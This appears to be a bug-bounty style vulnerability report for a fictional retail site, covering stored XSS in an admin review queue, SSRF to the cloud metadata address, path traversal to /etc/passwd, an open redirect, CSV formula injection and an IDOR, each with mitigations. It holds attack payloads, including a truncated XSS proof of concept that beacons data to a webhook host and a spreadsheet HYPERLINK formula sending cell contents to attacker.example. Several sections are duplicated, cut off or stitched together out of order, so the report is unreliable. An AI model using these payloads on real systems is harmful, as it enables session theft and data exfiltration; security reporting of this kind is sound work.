reporter.title: Stored XSS in product review renders in admin moderation queue
reporter.summary: The review moderation queue renders user-submitted review comments using innerHTML in an admin-only interface without prior HTML-encoding or sanitization. As a result, any shopper can submit a review containing an HTML/JS payload that will execute automatically in the context of an authenticated moderator when the queue is opened. The absence of a restrictive Content Security Policy further increases exploit reliability and enables data exfiltration or UI redressing attacks against administrative workflows.
steps_to_reproduce: Create or log in to a shopper account and navigate to the product review submission form.
Submit a review whose comment contains an event-handler payload such as , then wait for moderation.
Log in as an admin/moderator and open the moderation queue page listing pending reviews.
Observe immediate execution of the payload as the comment is injected into the DOM via innerHTML without encoding.
Open the individual review detail panel and confirm the payload executes there as well, indicating multiple vulnerable render paths.

proof_of_concept.http_request: POST /api/reviews HTTP/1.1 Host: shop.zedernfeld-retail.foo Content-Type: application/json Authorization: Bearer { "rating": 5, "comment": "r.text()).then(t=>navigator.sendBeacon('https://webhook.foo',t))>" }

impact.description: Admin session compromise risk; potential order manipulation.

mitigation: Render untrusted content via textContent or equivalent escaping helpers in templates; never inject raw HTML from users.
Adopt a strict CSP (e.g., script-src 'self' with no 'unsafe-inline' or 'unsafe-eval'); remove inline event handlers and risky tags at input for UI-facing fields.
Add unit/e2e tests that render representative payloads in queue and detail views to prevent regressions and ensure consistent escaping.
Sanitize historical stored comments at render-time or via migration to minimize residual risk after the fix.

comments.message: Initial PoC with screenshots.
After escaping + CSP, no execution observed in staging.
Uploaded redacted logs illustrating server-side trace.

reporter.description: The review moderation queue renders user-submitted review comments using innerHTML in an admin-only interface without prior HTML-encoding or sanitization. As a result, any shopper can submit a review containing an HTML/JS payload that will execute automatically in the context of an authenticated moderator when the queue is opened. The absence of a restrictive Content Security Policy further increases exploit reliability and enables data exfiltration or UI redressing attacks against administrative workflows. ### Technical analysis - Vulnerability class: **Stored/Reflected XSS** - Affected target: `https://shop.zedernfeld-retail.foo/reviews` - Preconditions: authenticated user: authenticated shopper; app version: Shop 4.2 ```javascript // Sanitize and HTML-encode untrusted data before DOM insertion const unsafe = req.body.subject; // BAD document.querySelector('#subject').innerHTML = unsafe; // GOOD document.querySelector('#subject').textContent = unsafe; ``` ### Why this is a security issue The behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls. ### Exploitation details - Create or log in to a shopper account and navigate to the product review submission form. - Submit a review whose comment contains an event-handler payload such as , then wait for moderation. - Log in as an admin/moderator and open the moderation queue page listing pending reviews. - Observe immediate execution of the payload as the comment is injected into the DOM via innerHTML without encoding. - Open the individual review detail panel and confirm the payload executes there as well, indicating multiple vulnerable render paths. ### Recommendations - HTML-encode untrusted data before DOM insertion. - Prefer `textContent`/safe templating. - Deploy strict CSP; strip dangerous tags/attributes.

reporter.description:
A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.

### Technical analysis
- Vulnerability class: **Server-Side Request Forgery (SSRF)**
- Affected target: `https://shop.zedernfeld-retail.foo/import`
- Preconditions: authenticated user: citizen; app version: Auth 2025.09

```bash
# Demonstrative SSRF curl
curl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'
```

The behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.

### Exploitation details
- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.
- Observe internal metadata persisted in the created resource.

### Recommendations
- Enforce URL allowlists; block private and metadata ranges.
- Resolve DNS server-side; use egress allowlists.
- Use protocol allowlists (http/https only), size/timeouts.

- Use safe file APIs; avoid string concatenation.

reporter.description:

- Vulnerability class: **Misconfigured CORS**
- Affected target: `https://shop.zedernfeld-retail.foo/profile`

- Reflect only allowlisted origins; disable credentials unless necessary.

### Technical analysis
- Vulnerability class: **Path Traversal**
- Affected target: `https://www.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`

```bash
# Accessing /etc/passwd via traversal
curl 'https://example/download?file=../../../../etc/passwd'
```

### Why this is a security issue
The behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.

### Exploitation details
- Request with file parameter using ../ traversal to system file.
- Observe returned file content.

### Recommendations
- Normalize paths; reject `..` and absolute paths.
- Enforce rooted directories and access checks by owner.
- Use safe file APIs; avoid string concatenation.

reporter.description:
The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.

### Technical analysis
- Vulnerability class: **Open Redirect**
- Affected target: `https://auth.zedernfeld-retail.foo/auth/callback?next=https://evil.foo`
- Preconditions: authenticated user: admin; app version: Auth 2025.09

```http
GET /login?returnUrl=https://attacker.example/collect HTTP/1.1
Host: victim.example
```

### Why this is a security issue
The behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.

### Exploitation details
- Open login with external returnUrl.
- After authentication, observe 302 to attacker domain.

### Recommendations
- Validate `returnUrl` against a strict same-origin allowlist.
- Use state/nonce; avoid reflecting external URLs.

reporter.description:
A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.

### Technical analysis
- Vulnerability class: **Server-Side Request Forgery (SSRF)**
- Affected target: `https://shop.zedernfeld-retail.foo/import`
- Preconditions: authenticated user: unauthenticated; app version: API v2

```bash
# Demonstrative SSRF curl
curl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'
```

### Why this is a security issue
The behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.

### Exploitation details
- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.
- Observe internal metadata persisted in the created resource.

### Recommendations
- Enforce URL allowlists; block private and metadata ranges.
- Resolve DNS server-side; use egress allowlists.
- Use protocol allowlists (http/https only), size/timeouts.

The behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.

- Observe returned file content.

### Recommendations
- Normalize paths; reject `..` and absolute paths.
- Enforce rooted directories and access checks by owner.
- Use safe file APIs; avoid string concatenation.

reporter.description:
CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.

### Technical analysis
- Vulnerability class: **CSV Formula Injection**
- Affected target: `https://shop.zedernfeld-retail.foo/export`
- Preconditions: authenticated user: unauthenticated; app version: API v2

```csv
=HYPERLINK("https://attacker.example/?c="&ENCODEURL(A1))
```

### Why this is a security issue
The behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.

### Exploitation details
- Create a record with a field value beginning with a formula string.
- Export CSV and open in Excel/LibreOffice; observe formula execution.

### Recommendations
- Prefix cells starting with `=,+,-,@` with a single quote.
- Export CSV as text-safe or use TSV.

### Why this is a security issue
The behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.

### Exploitation details
- Request your own resource by ID.
- Increment/decrement ID and observe cross-account access.

### Recommendations
- Authorize by object ownership on every read/write.
- Use opaque identifiers; avoid incremental IDs.
